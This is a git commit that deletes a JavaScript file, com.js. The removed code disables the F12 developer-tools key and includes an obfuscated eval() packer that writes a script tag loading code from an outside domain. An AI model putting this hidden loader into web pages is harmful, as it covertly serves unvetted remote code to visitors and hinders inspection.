d42cfb7f806f42e9b657cba684d3506b6ef17f91
bian8888 <122994298+bian8888@users.noreply.github.com>
2023-01-18 23:30:56 +0800

    Delete com.js

--- com.js
+++
@@ -1,9 +0,0 @@
-document.onkeydown = function (e) {
-var currentKey = 0, k = e || window.event;
-currentKey = k.keyCode || k.which || k.charCode;
-if (currentKey == 123) {
-window.event.cancelBubble = true;
-window.event.returnValue = false;
-}}
-
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('1 d="\\9";1 0="s\\z\\4\\m\\o\\n\\8\\p",h="\\t\\a\\r\\q\\j\\l\\2\\b\\4\\k\\i\\B//\\5\\5\\5\\3\\6\\a\\A\\C\\8\\3\\2\\E\\D",c="\\f\\x\\7\\3\\7\\v\\u\\g\\9\\f\\6\\2\\b\\4";1 e="\\g";0=0+h+c;s=d+0+e;w.y(s);',41,41,'s2|var|x63|x2e|x69pt|x77|x73|x67|x65|x3c|x74|x72|s4|s1|s5|x2f|x3e|s3|x72c|x61|x20s|x76as|x20t|x70|x79|x3D|x6A|x2F||x74ex|x66|x69|document|x62|write|x63r|x7a|x3d|x76|x6d|x6f'.split('|'),0,{}));
